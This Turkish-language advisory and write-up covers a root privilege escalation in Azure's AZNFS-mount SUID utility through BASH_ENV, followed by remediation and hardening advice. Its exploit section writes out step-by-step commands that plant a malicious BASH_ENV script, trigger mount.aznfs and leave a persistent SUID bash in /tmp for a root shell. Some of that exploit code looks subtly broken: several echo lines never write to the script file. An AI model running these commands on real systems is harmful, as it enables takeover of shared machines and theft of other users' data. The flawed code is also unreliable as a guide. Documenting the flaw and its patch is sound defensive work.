# Azure AZNFS-mount Utility Root Privilege Escalation

> **Keşif Tarihi:** Mayıs 2025  
> **Açıklama Tarihi:** 6-9 Mayıs 2025  
> **Platform:** Microsoft Azure — HPC/AI Linux VM'leri  
> **Saldırı Tipi:** Local Privilege Escalation → Root  
> **CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-426 (Untrusted Search Path)  
> **Keşfeden:** Varonis Threat Labs  
> **Düzeltme:** AZNFS-mount v2.0.11  
> **Durum:** Yamalandı — Otomatik güncelleme tavsiye edilir

---

## Özet

Varonis Threat Labs, Microsoft Azure'un AI ve High-Performance Computing (HPC) workload'larını barındıran Linux sanal makinelerine **önceden yüklenmiş** gelen **AZNFS-mount** yardımcı programında kritik bir privilege escalation güvenlik açığı tespit etti.

Zafiyet, classic bir SUID binary misconfiguration'dan kaynaklanmaktadır ve unprivileged bir yerel kullanıcının, `BASH_ENV` ortam değişkenini manipüle ederek `root` yetkisiyle keyfi komutlar çalıştırmasına olanak tanımaktadır. Etkilenen tüm sürümler (v2.0.10 ve öncesi) bu açıktan etkilenmektedir.

---

## Teknik Detaylar

### AZNFS-mount Nedir?

AZNFS-mount, Azure Blob Storage container'larını **NFS (Network File System)** protokolü üzerinden Linux instance'larına bağlamak (mount) için kullanılan bir yardımcı programdır. Büyük ölçekli yapılandırılmamış verilere ihtiyaç duyan AI ve HPC workload'ları için özellikle önemlidir.

**Kurulum Şekli:** `aznfs_install.sh` scripti `root` hesabıyla çalışır ve SUID bitli binary'ler oluşturur.

### SUID Binary'nin Rolü

SUID (Set User ID) biti, bir programın çalıştıran kullanıcının yerine dosya sahibinin (genellikle root) yetkileriyle çalışmasını sağlar. Bu, bazı meşru işlemler için gereklidir; ancak yanlış yapılandırıldığında ciddi güvenlik açıklarına yol açar.

```bash
# Savunmasız binary'nin dosya izinleri:
ls -la /usr/bin/mount.aznfs
# -rwsr-xr-x 1 root root ... /usr/bin/mount.aznfs
# ^^^^ 4755 modu — SUID biti etkin, herkes çalıştırabilir
```

`4755` modu:
- `4` → SUID biti etkin
- `755` → Herkes çalıştırabilir

### Güvenlik Açığı Mekanizması

```c
// mount.aznfs binary'sinin yaptığı işlem (basitleştirilmiş):
1. SUID biti sayesinde root olarak çalışır
2. Gerçek kullanıcı ID'sini root'a ayarlar (setuid(0))
3. /opt/microsoft/aznfs/mountscript.sh bash scriptini execv() ile çalıştırır
4. execv() çağrısı orijinal ortam değişkenlerini KORUR
```

**Kritik Sorun:** `execv()` ile bir Bash scripti çalıştırıldığında, `BASH_ENV` ortam değişkeni varsa Bash onu **script başlamadan önce kaynak olarak (source) alır**. Bu davranış, SUID ikili root yetkilerini zaten üstlendikten sonra gerçekleşir.

---

## Exploit — Adım Adım

### Saldırı Koşulları

- Hedef Azure VM'de yerel kullanıcı erişimi
- AZNFS-mount v2.0.10 veya öncesi kurulu

### Exploit Adımları

```bash
# Adım 1: Kötü niyetli komut içeren bir script oluşturun
echo '#!/bin/bash' > /tmp/malicious.sh
echo 'id > /tmp/pwned.txt'          # Proof of Concept
echo 'cp /bin/bash /tmp/rootbash'   # Kalıcı erişim için
echo 'chmod +s /tmp/rootbash'       # SUID bash
chmod +x /tmp/malicious.sh

# Adım 2: BASH_ENV değişkenini kötü niyetli scripte yönlendirin
export BASH_ENV=/tmp/malicious.sh

# Adım 3: SUID binary'yi tetikleyin
# (mount.aznfs çalışırken root olur ve BASH_ENV'i execute eder)
mount -t aznfs <storage-account>.blob.core.windows.net:/<container> /mnt/test

# Sonuç: /tmp/pwned.txt dosyası oluşur (root tarafından yazıldı)
# /tmp/rootbash artık SUID bash — root shell elde etmek için:
/tmp/rootbash -p
# whoami → root
```

### Varonis Araştırmacılarının Bulgusu

```bash
# Proof of Concept (Varonis):
export BASH_ENV='$(command)'
# Bash, bu ifadeyi değerlendirir ve sonucu filename olarak yüklemeye çalışır
# Bu sayede keyfi komutlar root yetkisiyle çalıştırılabilir
```

---

## Risk Analizi

### Neden Bu Kadar Tehlikeli?

```
Azure HPC/AI VM Ortamı:
    ├── Çoklu kullanıcı erişimi (araştırmacılar, veri bilimciler)
    ├── Büyük veri işleme workload'ları
    ├── Azure Storage bağlantıları (NFS üzerinden tam erişim)
    └── Potansiyel olarak değerli AI modelleri ve eğitim verileri
```

**Root Erişimi Sonrasında Mümkün Olanlar:**

1. Tüm Azure Storage container'larının montajı ve erişimi
2. Zararlı yazılım kurulumu (ransomware dahil)
3. SSH anahtarlarını çalma
4. Azure metadata service üzerinden VM kimlik bilgilerini çalma
5. Ağ içinde lateral movement

### Özellikle Tehlikeli Senaryo: Paylaşımlı Ortamlar

Azure HPC/AI ortamları genellikle birden fazla araştırmacı tarafından paylaşılır. Bu durum şu senaryoyu mümkün kılar:

```
Araştırmacı A → Zararlı niyetli veya hesabı ele geçirilmiş
    → AZNFS exploit çalıştırır
    → Root erişimi elde eder
    → Araştırmacı B ve C'nin verilerine erişir
    → Kurumsal AI modelleri ve eğitim verisi çalınır
```

---

## NFS Erişim Kontrolü Sorunu

Ek güvenlik notu: Azure Blob Storage'ın NFS endpoint'i erişim kontrollerini desteklememektedir. Bu, NFS endpoint'ine erişim sağlanması durumunda container içindeki **tüm nesnelere** erişilebilir anlamına gelir.

```
Kıyaslama:
REST API erişimi → Azure RBAC + SAS tokens → Granüler kontrol
NFS erişimi → Erişim kontrolü YOK → Tüm container açık
```

---

## Etkilenen Sürümler

| Durum | AZNFS-mount Sürümü |
|-------|-------------------|
| Savunmasız | v2.0.10 ve öncesi |
| Sabit | **v2.0.11** ve üzeri |

---

## Düzeltme

### Otomatik Güncelleme

AZNFS-mount'un otomatik güncelleme özelliğini etkinleştirin:

```bash
# Otomatik güncelleme etkinleştirme:
sudo aznfs_autoupdate enable
```

### Manuel Güncelleme

```bash
# Mevcut sürümü kontrol edin:
dpkg -l | grep aznfs           # Debian/Ubuntu
rpm -qa | grep aznfs           # RHEL/CentOS

# Güncelleme:
sudo apt-get update && sudo apt-get upgrade aznfs   # Debian/Ubuntu
sudo yum update aznfs                               # RHEL/CentOS
```

### Kubernetes Kullanıcıları

Kubernetes blob-csi-driver kullanıyorsanız, güncel sürümde AZNFS-mount v2.0.11'e yükseltme zaten yapılmıştır. Driver'ınızı güncelleyin.

---

## Ek Güvenlik Önlemleri

### SUID Binary Denetimi

```bash
# Sistemdeki tüm SUID binary'leri listeleyin:
find / -perm -4000 -type f 2>/dev/null

# Gereksiz SUID binary'lerin SUID bitini kaldırın:
sudo chmod -s /path/to/unnecessary_suid_binary
```

### Ortam Değişkeni Güvenliği

```bash
# Güvenli sudo yapılandırması — env_reset etkinleştir:
sudo visudo
# Şu satırın mevcut olduğundan emin olun:
Defaults env_reset
Defaults env_delete+="BASH_ENV"
```

---

## Microsoft'un Yanıtı

- Varonis'in sorumluluk anlayışıyla açıklamasının ardından Microsoft hızla yanıt verdi
- Azure, başlangıçta zafiyeti "düşük önem dereceli" olarak sınıflandırdı
- v2.0.11 yaması geliştirildi ve yayınlandı
- Kubernetes blob-csi-driver güncellendi
- Hızlı iletişim ve şeffaf düzeltme süreci örnek gösterilmektedir

---

## Kaynaklar

- [Varonis Tehdit Araştırması — Teknik Analiz](https://www.varonis.com/blog/aznfs-root-privilege-escalation-on-azure)
- [CloudVulnDB](https://www.cloudvulndb.org/aznfs-root-privilege-escalation)
- [GBHackers Haberi](https://gbhackers.com/azure-storage-utility-vulnerability/)

---

*© 2025 AltHack Security — Gerçek Dünya Siber Güvenlik İstihbaratı*
